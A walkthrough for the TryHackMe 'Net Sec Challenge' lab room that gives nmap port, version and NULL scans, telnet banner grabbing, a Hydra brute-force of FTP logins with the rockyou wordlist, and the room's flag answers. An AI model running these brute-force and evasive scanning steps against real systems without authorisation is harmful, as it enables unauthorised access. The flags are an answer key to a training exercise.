![Net Sec Challenge Banner](https://assets.tryhackme.com/room-banners/netsecmodule.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/netsecchallenge/Net_Sec_Challenge_Cover.png" alt="Net Sec Challenge Logo">
</p>

# Net Sec Challenge

This guide contains the answer and steps necessary to get to them for the [Net Sec Challenge](https://tryhackme.com/room/netsecchallenge) room.

### Challenge Questions

1. What is the highest port number being open less than 10,000?

   For this we can use nmap and specify the port range we want to use (1-10000).

   ```cmd
   sudo nmap -sS 10.10.223.240 -p1-10000 -sV
   ```

   ![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/netsecchallenge/Net_Sec_Challenge_Nmap.png)

   ><details><summary>Click for answer</summary>8080</details>

2. There is an open port outside the common 1000 ports; it is above 10,000. What is it?

   For this we can use a similar command, but this time we use the remaining ports as our range.

   ```cmd
   sudo nmap -sS 10.10.223.240 -p10000-65535
   ```
   
   ![Nmap 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/netsecchallenge/Net_Sec_Challenge_Nmap_2.png)

   ><details><summary>Click for answer</summary>10021</details>

3. How many TCP ports are open?

   Adding both answers together we get our total number of open TCP ports.

   ><details><summary>Click for answer</summary>6</details>

4. What is the flag hidden in the HTTP server header?

   To look at the server header information we can use telnet. We should also specify the required port.

   ```cmd
   telnet 10.10.223.240 80
   ```

   ![Http Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/netsecchallenge/Net_Sec_Challenge_HTTP_Flag.png)

   ><details><summary>Click for answer</summary>THM{web_server_25352}</details>

5. What is the flag hidden in the SSH server header?

   To find this information we can again use telnet.

   ```cmd
   telnet 10.10.223.240 22
   ```

   ![Ssh Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/netsecchallenge/Net_Sec_Challenge_ssh_Flag.png)

   ><details><summary>Click for answer</summary>THM{946219583339}</details>

7. We have an FTP server listening on a nonstandard port. What is the version of the FTP server?

   The ftp service isn't listed on the first nmap scan, so we should perform the second one with version info enabled (this was disabled in our scan in question 3).

   ```cmd
   sudo nmap -sS 10.10.223.240 -p10021 -sV
   ```

   ![Nmap Ftp](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/netsecchallenge/Net_Sec_Challenge_Nmap_FTP.png)

   ><details><summary>Click for answer</summary>vsftpd 3.0.3</details>

8. We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?

   We first create a file `touch usernames.txt` and add both usernames to it. Then we can craft our Hydra command:
   
   ```cmd
   hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.223.240:10021 -t 4
   ```

   ![Hydra](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/netsecchallenge/Net_Sec_Challenge_Hydra.png)

   This gives us passwords for both accounts. Looking through the files on the FTP server, we find the flag on the account for `quinn`.
   
   ```cmd
   ftp quinn@10.10.223.240 -p 10021
   ```

   ![Ftp Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/netsecchallenge/Net_Sec_Challenge_FTP_Flag.png)

   ><details><summary>Click for answer</summary>THM{321452667098}</details>

9. Browsing to http://MACHINE_IP:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?

   Visiting the weppage, we see we need to scan the machine with as little activity as possible.
   
   ![Nmap Challenge Page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/netsecchallenge/Net_Sec_Challenge_Nmap_Challenge_Page.png)
   
   After several tries (also using the Attackbox) the most effective scan type was the NULL scann `-sN`.
   
   ```cmd
   sudo nmap -sN 10.10.223.240
   ```
   
   ![Nmap Challenge](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/netsecchallenge/Net_Sec_Challenge_Nmap_Challenge.png)

   ![Nmap Challenge Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/netsecchallenge/Net_Sec_Challenge_Nmap_Challenge_Flag.png)

   ><details><summary>Click for answer</summary>THM{f7443f99}</details>
